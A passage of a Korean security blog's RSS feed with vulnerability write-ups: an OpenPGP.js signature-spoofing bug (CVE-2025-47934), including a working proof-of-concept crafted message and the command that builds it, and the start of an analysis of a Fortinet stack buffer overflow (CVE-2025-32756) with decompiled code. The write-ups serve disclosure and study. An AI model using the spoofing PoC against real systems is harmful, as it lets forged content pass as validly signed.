class="hljs-comment">//   cat \</span>    <span class="hljs-comment">//     &lt;(echo &quot;legitimate&quot; | gpg -s -z0) \</span>    <span class="hljs-comment">//     &lt;(printf &quot;\xc8\x12\0\xcb\x0f\x62\0\0\0\0\0malicious&quot;) \</span>    <span class="hljs-comment">//   | base64</span>    <span class="hljs-keyword">let</span> armoredMessage = <span class="hljs-string">`</span><span class="hljs-string">-----BEGIN PGP MESSAGE-----</span><span class="hljs-string"></span><span class="hljs-string">kA0DAAoW1Fu2hl5UcsoByxFiAGhBNptsZWdpdGltYXRlCoh1BAAWCgAdFiEEXSzQbblMQiJ8GaYN</span><span class="hljs-string">1Fu2hl5UcsoFAmhBNpsACgkQ1Fu2hl5UcsqE0QD/bsWYHJrrrK8RM8VgB4Z3K64zWfp49BOi+x0s</span><span class="hljs-string">9VJKyRoBALJdQhGzPwCERCANPR+KdX5ZdrX54ZpY9mriFG6O4hsFyBIAyw9iAAAAAABtYWxpY2lv</span><span class="hljs-string">dXM=</span><span class="hljs-string">-----END PGP MESSAGE-----`</span>;    <span class="hljs-comment">// public key of thomas@codean.io</span>    <span class="hljs-keyword">const</span> publicKeyArmored = <span class="hljs-string">`</span><span class="hljs-string">-----BEGIN PGP PUBLIC KEY BLOCK-----</span><span class="hljs-string"></span><span class="hljs-string">mDMEZSAfBhYJKwYBBAHaRw8BAQdAfdgd2yxL+pYN91ENyp/VZVdWXLjYDONG47jM</span><span class="hljs-string">4dDZDMG0IFRob21hcyBSaW5zbWEgPHRob21hc0Bjb2RlYW4uaW8+iI8EExYIADcW</span><span class="hljs-string">IQRdLNBtuUxCInwZpg3UW7aGXlRyygUCZSAfBgUJBaOagAIbAwQLCQgHBRUICQoL</span><span class="hljs-string">BRYCAwEAAAoJENRbtoZeVHLKpvIBANiaDeLPyaQyHkuzB8T6ZqvfJi4dXNlsqT2F</span><span class="hljs-string">dlUUip4ZAQDSAljghQC9jAQu8I8yMrQJd4SXD1EMH+NLNNYCDEZCC7g4BGUgHwYS</span><span class="hljs-string">CisGAQQBl1UBBQEBB0DOFmUm2nMIda8PzTquulLLy/bFwDtSqAiK1EBqEdvbaAMB</span><span class="hljs-string">CAeIfgQYFggAJhYhBF0s0G25TEIifBmmDdRbtoZeVHLKBQJlIB8GBQkFo5qAAhsM</span><span class="hljs-string">AAoJENRbtoZeVHLKCE8BAJEXE6za1G6pFpaZWKBRMlCbBDSE4rc7iEn5MpC56WtQ</span><span class="hljs-string">AQCnVhRNYBjQ7Bo/VX1rx2+6wx84EXOFmoW80F96QmN0Bw==</span><span class="hljs-string">=Obk+</span><span class="hljs-string">-----END PGP PUBLIC KEY BLOCK-----`</span>;    <span class="hljs-keyword">const</span> publicKey = <span class="hljs-keyword">await</span> openpgp.readKey({ <span class="hljs-attr">armoredKey</span>: publicKeyArmored });    <span class="hljs-keyword">const</span> message = <span class="hljs-keyword">await</span> openpgp.readMessage({ armoredMessage });    <span class="hljs-keyword">const</span> verificationResult = <span class="hljs-keyword">await</span> openpgp.verify({ message, <span class="hljs-attr">verificationKeys</span>: publicKey });    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Signed message data: <span class="hljs-subst">${verificationResult.data}</span>`</span>);    <span class="hljs-keyword">const</span> { verified, keyID } = verificationResult.signatures[<span class="hljs-number">0</span>];    <span class="hljs-keyword">try</span> {        <span class="hljs-keyword">await</span> verified; <span class="hljs-comment">// throws on invalid signature</span>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Verified signature by key id <span class="hljs-subst">${keyID.toHex()}</span>`</span>);    } <span class="hljs-keyword">catch</span> (e) {        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">`Signature could not be verified: <span class="hljs-subst">${e.message}</span>`</span>);    }})();</code></pre><ol><li>&#xC2A4;&#xD2B8;&#xB9BC; &#xD30C;&#xC2F1;&#xC758; &#xBD88;&#xC644;&#xC804;&#xC131;</li></ol><ul><li><code>openpgp.readMessage()</code> &#xD568;&#xC218;&#xB294; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xD30C;&#xC2F1;&#xD560; &#xB54C; &#xAC00;&#xC7A5; &#xCCAB; &#xBC88;&#xC9F8; Literal Data &#xD328;&#xD0B7;&#xB9CC; &#xC77D;&#xACE0; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC774;&#xD6C4;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xB098;&#xBA38;&#xC9C0; &#xD328;&#xD0B7;(&#xC608;: &#xC545;&#xC131; &#xB370;&#xC774;&#xD130;)&#xC740; &#xC77D;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;&#xB85C; &#xC2A4;&#xD2B8;&#xB9BC;(&#xBA54;&#xBAA8;&#xB9AC;)&#xC5D0; &#xB0A8;&#xAC8C; &#xB418;&#xBA70;, &#xD6C4;&#xC18D; &#xCC98;&#xB9AC;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC774;&#xB294; &#xC11C;&#xBA85; &#xAC80;&#xC99D; &#xB85C;&#xC9C1;&#xC774; &#xC774;&#xD6C4; &#xB370;&#xC774;&#xD130;&#xC758; &#xC874;&#xC7AC; &#xC5EC;&#xBD80;&#xB97C; &#xC778;&#xC9C0;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB3C4;&#xB85D; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xB294; &#xAE30;&#xBC18;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;.</li></ul><ol><li>&#xAC80;&#xC99D; &#xB85C;&#xC9C1;&#xC758; &#xCDE8;&#xC57D;&#xC810;</li></ol><pre><code class="hljs jsx"><span class="hljs-keyword">async</span> verify(verificationKeys, date = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>(), config = defaultConfig) {  <span class="hljs-keyword">const</span> msg = <span class="hljs-built_in">this</span>.unwrapCompressed(); <span class="hljs-comment">// [1]</span>    <span class="hljs-keyword">const</span> literalDataList = msg.packets.filterByTag(enums.packet.literalData);  <span class="hljs-keyword">if</span> (literalDataList.length !== <span class="hljs-number">1</span>) {    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&apos;Can only verify message with one literal data packet.&apos;</span>);  }    <span class="hljs-keyword">if</span> (isArrayStream(msg.packets.stream)) {    msg.packets.push(...await streamReadToEnd(msg.packets.stream, <span class="hljs-function"><span class="hljs-params">_</span> =&gt;</span> _ || [])); <span class="hljs-comment">// [2]</span>  }  <span class="hljs-keyword">const</span> onePassSigList = msg.packets.filterByTag(enums.packet.onePassSignature).reverse();  <span class="hljs-keyword">const</span> signatureList = msg.packets.filterByTag(enums.packet.signature);  <span class="hljs-comment">// ...</span></code></pre><ul><li><p><code>openpgp.verify()</code> &#xD638;&#xCD9C; &#xC2DC;, &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <code>unwrapCompressed()</code> &#xD568;&#xC218;&#xAC00; &#xB3D9;&#xC791;&#xD558;&#xC5EC; &#xC555;&#xCD95;&#xB41C; &#xD328;&#xD0B7;&#xB9CC; &#xCC3E;&#xC544; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;( [ 1 ] ).</p><ul><li><p><code>const msg = this.unwrapCompressed();</code>: &#xC774; &#xC2DC;&#xC810;&#xC5D0;&#xC11C; <code>this.packets</code>&#xC740; &#xC544;&#xC9C1; &#xC644;&#xC804;&#xD558;&#xAC8C; &#xD30C;&#xC2F1;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xC73C;&#xBBC0;&#xB85C;, <code>unwrapCompressed()</code>&#xB294; <code>Compressed Data</code> &#xD328;&#xD0B7;&#xC744; &#xCC3E;&#xC9C0; &#xBABB;&#xD558;&#xACE0; <code>this</code> (&#xC6D0;&#xBCF8; &#xD328;&#xD0B7; &#xB9AC;&#xC2A4;&#xD2B8;)&#xB97C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC11C;&#xBA85; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <code>literalDataList</code>&#xB294; &#x201C;legitimate&#x201D; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; <code>Literal Data</code> &#xD328;&#xD0B7;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p>  <pre><code class="hljs jsx">unwrapCompressed() {   <span class="hljs-keyword">const</span> compressed = <span class="hljs-built_in">this</span>.packets.filterByTag(enums.packet.compressedData);   <span class="hljs-keyword">if</span> (compressed.length) {     <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Message(compressed[<span class="hljs-number">0</span>].packets);   }   <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>; }</code></pre></li></ul></li><li><p>&#xC774;&#xB54C; &#xC555;&#xCD95;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xB098;&#xBA38;&#xC9C0; &#xD328;&#xD0B7;&#xC740; &#xBB34;&#xC2DC;&#xB418;&#xBA70;, &#xAC80;&#xC99D; &#xB300;&#xC0C1;&#xC5D0;&#xC11C; &#xC81C;&#xC678;&#xB429;&#xB2C8;&#xB2E4;.</p></li><li>&#xADF8;&#xB7EC;&#xB098; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xBC18;&#xD658;&#xB418;&#xB294; <code>verificationResult.data</code>&#xC5D0;&#xB294; &#xC774; <strong>&#xAC80;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xD328;&#xD0B7;&#xC758; &#xB0B4;&#xC6A9;&#xB3C4; &#xD3EC;&#xD568;</strong>&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;( [ 2 ]).<ul><li><code>msg.packets.push(...await streamReadToEnd(msg.packets.stream, _ =&gt; _ || []));</code> : &#xC774; &#xC2DC;&#xC810;&#xC5D0;&#xC11C; &#xC11C;&#xBA85; &#xAC80;&#xC99D;&#xC774; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C4; &#xD6C4;, &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; <code>verificationResult.data</code>&#xC5D0; &#xC2E4;&#xC81C; &#xBA54;&#xC2DC;&#xC9C0; &#xB0B4;&#xC6A9;&#xC744; &#xB2F4;&#xAE30; &#xC704;&#xD574; <code>streamReadToEnd()</code>&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. <code>streamReadToEnd()</code>&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xC5B4; &#xC2A4;&#xD2B8;&#xB9BC;&#xC5D0; &#xB0A8;&#xC544; &#xC788;&#xB358; &#xBAA8;&#xB4E0; &#xD328;&#xD0B7;(&#xC989;, <code>Signature</code> &#xD328;&#xD0B7;&#xACFC; <code>Compressed Data</code> &#xD328;&#xD0B7;)&#xC774; <code>msg.packets</code> &#xBC30;&#xC5F4;&#xC5D0; &#xCD94;&#xAC00;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; <code>msg.packets</code>&#xB294; &#xC644;&#xC804;&#xD55C; &#xACF5;&#xACA9;&#xC790;&#xC758; &#xC870;&#xC791;&#xB41C; &#xD328;&#xD0B7; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</li></ul></li></ul><ol><li><code>result.data</code> &#xC124;&#xC815; &#xC2DC; <code>unwrapCompressed()</code> &#xC7AC;&#xD638;&#xCD9C; &#xBC0F; &#xC545;&#xC131; &#xB370;&#xC774;&#xD130; &#xBC18;&#xD658;</li></ol><pre><code class="hljs jsx">...<span class="hljs-keyword">if</span> (signature) {  result.signatures = <span class="hljs-keyword">await</span> message.verifyDetached(signature, verificationKeys, date, config);} <span class="hljs-keyword">else</span> {  result.signatures = <span class="hljs-keyword">await</span> message.verify(verificationKeys, date, config);}result.data = format === <span class="hljs-string">&apos;binary&apos;</span> ? message.getLiteralData() : message.getText();...</code></pre><p>&#xC11C;&#xBA85; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC; &#xC790;&#xCCB4;&#xB294; &#x201C;legitimate&#x201D; &#xB370;&#xC774;&#xD130;&#xC5D0; &#xB300;&#xD574; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xC218;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; <code>openpgp.verify()</code>&#xC758; &#xB9C8;&#xC9C0;&#xB9C9; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; <code>result.data</code>&#xB97C; &#xC124;&#xC815;&#xD558;&#xAE30; &#xC704;&#xD574; <code>message.getLiteralData()</code> (&#xB610;&#xB294; <code>message.getText()</code>)&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xD568;&#xC218; &#xC5ED;&#xC2DC; <code>unwrapCompressed()</code>&#xB97C; &#xB2E4;&#xC2DC; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. <code>streamReadToEnd()</code> &#xD638;&#xCD9C;&#xB85C; &#xC778;&#xD574; <code>msg.packets</code>&#xAC00; &#xC774;&#xC81C; &#xC644;&#xC804;&#xD55C; &#xD328;&#xD0B7; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xBBC0;&#xB85C;, <code>unwrapCompressed()</code>&#xB294; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC0BD;&#xC785;&#xD55C; &#xCCAB; &#xBC88;&#xC9F8; <code>Compressed Data</code> &#xD328;&#xD0B7;(&#xC545;&#xC131; &#x201C;malicious&#x201D; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294;)&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xBC18;&#xD658;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C;, OpenPGP.js&#xB294; &#x201C;legitimate&#x201D; &#xB370;&#xC774;&#xD130;&#xC5D0; &#xB300;&#xD55C; &#xC11C;&#xBA85;&#xC744; &#xC720;&#xD6A8;&#xD558;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;&#xD558;&#xBA74;&#xC11C;&#xB3C4;, &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C;&#xB294; <code>verificationResult.data</code> &#xB610;&#xB294; <code>message.getText()</code>&#xB97C; &#xD1B5;&#xD574; &#x201C;malicious&#x201D; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD45C;&#xC2DC;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xC720;&#xD6A8;&#xD55C; &#xC11C;&#xBA85;&#xC744; &#xAC00;&#xC9C4; &#xBA54;&#xC2DC;&#xC9C0;&#xC758; &#xB0B4;&#xC6A9;&#xC774; &#xACF5;&#xACA9;&#xC790;&#xC5D0; &#xC758;&#xD574; &#xC784;&#xC758;&#xB85C; &#xC870;&#xC791;&#xB41C; &#xAC83;&#xCC98;&#xB7FC; &#xBCF4;&#xC774;&#xAC8C; &#xB9CC;&#xB4DC;&#xB294; &#xC2A4;&#xD478;&#xD551; &#xACF5;&#xACA9;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC554;&#xD638;&#xD654;&#xB41C; &#xBA54;&#xC2DC;&#xC9C0;&#xC758; &#xACBD;&#xC6B0;&#xC5D0;&#xB3C4; <code>openpgp.decrypt()</code>&#xAC00; &#xB3D9;&#xC77C;&#xD55C; &#xAC80;&#xC99D; &#xB85C;&#xC9C1;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBBC0;&#xB85C;, &#xBCF5;&#xD638;&#xD654;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB294; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC81C;&#xC5B4;&#xD558;&#xB294; &#x201C;malicious&#x201D; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB85C; &#xBC18;&#xD658;&#xB418;&#xC9C0;&#xB9CC;, &#xC11C;&#xBA85; &#xAC80;&#xC99D; &#xACB0;&#xACFC;&#xB294; &#xC6D0;&#xBCF8; &#x201C;legitimate&#x201D; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xC5D0; &#xB300;&#xD574; &#xACC4;&#xC0B0;&#xB418;&#xC5B4; &#xC720;&#xD6A8;&#xD558;&#xB2E4;&#xACE0; &#xD45C;&#xC2DC;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">Signed message data: maliciousVerified signature by key id d45bb6865e5472ca:</code></pre><p>&#xACF5;&#xACA9; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB97C; &#xAC04;&#xB2E8;&#xD788; &#xC694;&#xC57D;&#xD558;&#xBA74; &#xC774;&#xB807;&#xAC8C; &#xD45C;&#xD604;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xACF5;&#xACA9;&#xC790;&#xB294; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xC11C;&#xBA85; &#xBA54;&#xC2DC;&#xC9C0;(&#xC608;: <code>&quot;Transfer $100&quot;</code>&#xC5D0; &#xB300;&#xD55C; &#xC720;&#xD6A8; &#xC11C;&#xBA85;)&#xB97C; &#xD655;&#xBCF4;&#xD55C; &#xB4A4;,</li><li>&#xD574;&#xB2F9; &#xBA54;&#xC2DC;&#xC9C0; &#xB4A4;&#xC5D0; &#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; &#xC545;&#xC758;&#xC801;&#xC778; &#xD328;&#xD0B7;(&#xC608;: <code>&quot;Transfer $10,000&quot;</code>)&#xC744; &#xC0BD;&#xC785;&#xD558;&#xC5EC; <strong>&#xD558;&#xB098;&#xC758; &#xBA54;&#xC2DC;&#xC9C0;&#xB85C; &#xAD6C;&#xC131;</strong>&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xAC80;&#xC99D; &#xACFC;&#xC815;&#xC5D0;&#xC11C;&#xB294; &#xC815;&#xC0C1; &#xC11C;&#xBA85;&#xB41C; &#xBD80;&#xBD84;(<code>&quot;Transfer $100&quot;</code>)&#xB9CC; &#xAC80;&#xC99D;&#xB418;&#xBA70; &#xC11C;&#xBA85;&#xC740; &#x201C;&#xC720;&#xD6A8;&#x201D;&#xB85C; &#xD45C;&#xC2DC;&#xB429;&#xB2C8;&#xB2E4;.</li><li>&#xADF8;&#xB7EC;&#xB098; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xBC18;&#xD658;&#xB418;&#xB294; &#xB370;&#xC774;&#xD130;&#xB294; <strong>&#xC545;&#xC131; &#xD328;&#xD0B7;&#xAE4C;&#xC9C0; &#xD3EC;&#xD568;&#xD55C; &#xB370;&#xC774;&#xD130;</strong>&#xB85C;&#xC11C;, &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xBCF4;&#xAE30;&#xC5D0;&#xB294; <strong>&#xC815;&#xC0C1; &#xC11C;&#xBA85;&#xB41C; &#xAC83;&#xC73C;&#xB85C; &#xC624;&#xC778;</strong>&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</li></ul><p>&#xC989;, &#xACF5;&#xACA9;&#xC790;&#xB294; &#xD53C;&#xD574;&#xC790;&#xC758; &#xAE30;&#xC874; &#xC11C;&#xBA85;&#xC744; &#xC7AC;&#xC0AC;&#xC6A9;&#xD574; &#xC784;&#xC758;&#xC758; &#xBA54;&#xC2DC;&#xC9C0;&#xB85C; &#xC11C;&#xBA85;&#xC744; &#xC704;&#xC870;(spoof)&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/openpgpjs/openpgpjs/security/advisories/GHSA-8qff-qr5q-5pr8">https://github.com/openpgpjs/openpgpjs/security/advisories/GHSA-8qff-qr5q-5pr8</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/PGP/">PGP</category>
      
      <category domain="https://hackyboiz.github.io/tags/OpenPGP-js/">OpenPGP.js</category>
      
      <category domain="https://hackyboiz.github.io/tags/sign/">sign</category>
      
      <category domain="https://hackyboiz.github.io/tags/spoofing/">spoofing</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-47934/">CVE-2025-47934</category>
      
      
      <comments>https://hackyboiz.github.io/2025/06/12/OUYA77/2025-06-12/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-32756: Fortinet 제품들의 API에서 발생한 ITW Stack Buffer Overflow 취약점으로 인한 Unauthenticated RCE</title>
      <link>https://hackyboiz.github.io/2025/06/11/j0ker/2025-06-11/</link>
      <guid>https://hackyboiz.github.io/2025/06/11/j0ker/2025-06-11/</guid>
      <pubDate>Wed, 11 Jun 2025 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://horizon3.ai/attack-research/attack-blogs/cv</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://horizon3.ai/attack-research/attack-blogs/cve-2025-32756-low-rise-jeans-are-back-and-so-are-buffer-overflows/">CVE-2025-32756: Low-Rise Jeans are Back and so are Buffer Overflows</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><div class="table-container"><table><thead><tr><th>Version</th><th>Affected</th><th>Solution</th></tr></thead><tbody><tr><td>FortiCamera 2.1</td><td>2.1.0 through 2.1.3</td><td>Upgrade to 2.1.4 or above</td></tr><tr><td>FortiCamera 2.0</td><td>2.0 all versions</td><td>Migrate to a fixed release</td></tr><tr><td>FortiCamera 1.1</td><td>1.1 all versions</td><td>Migrate to a fixed release</td></tr><tr><td>FortiMail 7.6</td><td>7.6.0 through 7.6.2</td><td>Upgrade to 7.6.3 or above</td></tr><tr><td>FortiMail 7.4</td><td>7.4.0 through 7.4.4</td><td>Upgrade to 7.4.5 or above</td></tr><tr><td>FortiMail 7.2</td><td>7.2.0 through 7.2.7</td><td>Upgrade to 7.2.8 or above</td></tr><tr><td>FortiMail 7.0</td><td>7.0.0 through 7.0.8</td><td>Upgrade to 7.0.9 or above</td></tr><tr><td>FortiNDR 7.6</td><td>7.6.0</td><td>Upgrade to 7.6.1 or above</td></tr><tr><td>FortiNDR 7.4</td><td>7.4.0 through 7.4.7</td><td>Upgrade to 7.4.8 or above</td></tr><tr><td>FortiNDR 7.2</td><td>7.2.0 through 7.2.4</td><td>Upgrade to 7.2.5 or above</td></tr><tr><td>FortiNDR 7.1</td><td>7.1 all versions</td><td>Migrate to a fixed release</td></tr><tr><td>FortiNDR 7.0</td><td>7.0.0 through 7.0.6</td><td>Upgrade to 7.0.7 or above</td></tr><tr><td>FortiNDR 1.5</td><td>1.5 all versions</td><td>Migrate to a fixed release</td></tr><tr><td>FortiNDR 1.4</td><td>1.4 all versions</td><td>Migrate to a fixed release</td></tr><tr><td>FortiNDR 1.3</td><td>1.3 all versions</td><td>Migrate to a fixed release</td></tr><tr><td>FortiNDR 1.2</td><td>1.2 all versions</td><td>Migrate to a fixed release</td></tr><tr><td>FortiNDR 1.1</td><td>1.1 all versions</td><td>Migrate to a fixed release</td></tr><tr><td>FortiRecorder 7.2</td><td>7.2.0 through 7.2.3</td><td>Upgrade to 7.2.4 or above</td></tr><tr><td>FortiRecorder 7.0</td><td>7.0.0 through 7.0.5</td><td>Upgrade to 7.0.6 or above</td></tr><tr><td>FortiRecorder 6.4</td><td>6.4.0 through 6.4.5</td><td>Upgrade to 6.4.6 or above</td></tr><tr><td>FortiVoice 7.2</td><td>7.2.0</td><td>Upgrade to 7.2.1 or above</td></tr><tr><td>FortiVoice 7.0</td><td>7.0.0 through 7.0.6</td><td>Upgrade to 7.0.7 or above</td></tr><tr><td>FortiVoice 6.4</td><td>6.4.0 through 6.4.10</td><td>Upgrade to 6.4.11 or above</td></tr></tbody></table></div><h2 id="&#xBC30;&#xACBD;&#xC9C0;&#xC2DD;"><a href="#&#xBC30;&#xACBD;&#xC9C0;&#xC2DD;" class="headerlink" title="&#xBC30;&#xACBD;&#xC9C0;&#xC2DD;"></a>&#xBC30;&#xACBD;&#xC9C0;&#xC2DD;</h2><p>CVE-2025-32756&#xB294; admin.fe &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; Stack Buffer Overflow &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC6D0;&#xACA9;&#xC73C;&#xB85C; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; FortiVoice&#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xC2E4;&#xC81C; &#xACF5;&#xACA9;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xC5C8;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xC790;&#xC138;&#xD55C; IoC&#xB294; &#xC544;&#xB798; &#xB9C1;&#xD06C;&#xB97C; &#xCC38;&#xC870;&#xD558;&#xC138;&#xC694;.</p><ul><li><a href="https://fortiguard.fortinet.com/psirt/FG-IR-25-254">Stack-based buffer overflow vulnerability in API</a></li></ul><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; admin.fe &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xC5D0; &#xC804;&#xB2EC;&#xB41C; &#xC778;&#xC790; &#xC911; AuthHash&#xB97C; &#xCC98;&#xB9AC;&#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs c"><span class="hljs-keyword">size_t</span> input_size;<span class="hljs-keyword">size_t</span> __size;uchar *AuthHash;uchar *Payload;<span class="hljs-keyword">long</span> output_buffer [<span class="hljs-number">2</span>];out_00 = (uchar *)<span class="hljs-built_in">malloc</span>(__size);iVar2 = __isoc99_sscanf(param_1,<span class="hljs-string">&quot;Era=%1d&amp;Payload=%m[^&amp;]&amp;AuthHash=%m[^&amp;]&amp;&quot;</span>,&amp;Era,&amp;Payload, &amp;AuthHash);input_size = <span class="hljs-built_in">strlen</span>((<span class="hljs-keyword">char</span> *)AuthHash);__size = <span class="hljs-built_in">strlen</span>((<span class="hljs-keyword">char</span> *)Payload);iVar3 = EVP_DecodeUpdate(ctx,(uchar *)output_buffer,&amp;output_size,AuthHash,(<span class="hljs-keyword">int</span>)input_size);iVar2 = EVP_DecodeUpdate(ctx,out_00,&amp;local_94,Payload,iVar2);</code></pre><p>AuthHash&#xB294; &#xBCC0;&#xC218; &#xC774;&#xB984;&#xCC98;&#xB7FC; &#xD574;&#xC2DC; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC804;&#xC1A1;&#xB429;&#xB2C8;&#xB2E4;. AuthHash&#xAC00; &#xB514;&#xCF54;&#xB529;&#xB41C; &#xACBD;&#xACFC;&#xAC00; output_buffer&#xB77C;&#xB294; &#xC9C0;&#xC5ED;&#xBCC0;&#xC218;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xBA70; &#xD06C;&#xAE30;&#xB294; 16&#xBC14;&#xC774;&#xD2B8; &#xC785;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xB514;&#xCF54;&#xB529;&#xB41C; &#xACB0;&#xACFC;&#xAC00; 16&#xBC14;&#xC774;&#xD2B8; &#xC774;&#xC0C1;&#xC77C; &#xACBD;&#xC6B0;, Stack Buffer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xD328;&#xCE58;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC778;&#xD48B;&#xC758; &#xC0AC;&#xC774;&#xC988;&#xAC00; 0x1e&#xBCF4;&#xB2E4; &#xC791;&#xC740;&#xC9C0; &#xCCB4;&#xD06C;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC9C4;&#xD589;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.<br><pre><code class="hljs c"><span class="hljs-keyword">size_t</span> input_size;<span class="hljs-keyword">size_t</span> __size;uchar *AuthHash;uchar *Payload;<span 